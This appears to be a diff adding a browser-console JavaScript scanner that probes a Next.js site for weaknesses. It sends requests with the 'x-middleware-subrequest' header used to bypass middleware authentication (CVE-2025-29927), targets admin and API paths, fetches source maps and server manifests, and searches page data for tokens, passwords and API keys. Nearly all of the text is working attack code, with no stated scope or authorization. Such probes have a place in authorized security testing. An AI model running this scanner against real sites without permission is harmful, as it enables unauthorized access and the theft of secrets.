@@ -1,0 +1,71 @@
+(async () => {
+  const paths = [
+    location.pathname,
+    "/admin", "/dashboard", "/profile", "/account", "/settings",
+    "/api/admin", "/api/user", "/api/me", "/api/profile",
+    "/_next/static/chunks/main.js.map",
+    "/_next/static/chunks/webpack.js.map",
+    "/_next/static/chunks/framework.js.map",
+    "/_next/static/chunks/pages/_app.js.map",
+    "/_next/static/chunks/pages/index.js.map",
+    "/_next/server/middleware-manifest.json",
+    "/.next/server/middleware-manifest.json",
+    "/_next/image?url=https://example.com/favicon.ico&w=64&q=75"
+  ];
+
+  const sensitive = /token|secret|password|apiKey|api_key|authorization|bearer|client_secret|private_key|access_token|refresh_token/i;
+
+  async function req(path, opts = {}) {
+    try {
+      const r = await fetch(path, {
+        method: opts.method || "GET",
+        credentials: "include",
+        headers: opts.headers || {}
+      });
+      const text = await r.text();
+      return {
+        path,
+        status: r.status,
+        len: text.length,
+        body: text.slice(0, 5000),
+        headers: Object.fromEntries(r.headers.entries())
+      };
+    } catch (e) {
+      return { path, error: String(e) };
+    }
+  }
+
+  const results = [];
+
+  for (const p of paths) {
+    const normal = await req(p);
+    const bypass = await req(p, {
+      headers: {
+        "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"
+      }
+    });
+
+    const finding = { path: p, normal: normal.status, bypass: bypass.status };
+
+    if (normal.status !== 200 && bypass.status === 200) {
+      finding.issue = "Possible CVE-2025-29927 middleware bypass";
+    }
+
+    if (normal.body?.includes('"mappings"') || normal.body?.includes('"sources"')) {
+      finding.issue = "Source map exposed";
+    }
+
+    if (normal.body?.includes("__NEXT_DATA__") && sensitive.test(normal.body)) {
+      finding.issue = "Sensitive keyword inside __NEXT_DATA__";
+    }
+
+    if (normal.body?.match(/middleware-manifest|pages-manifest|sortedMiddleware/)) {
+      finding.issue = "Next.js server manifest exposed";
+    }
+
+    results.push(finding);
+  }
+
+  console.table(results);
+  console.log("Full results:", results);
+})();
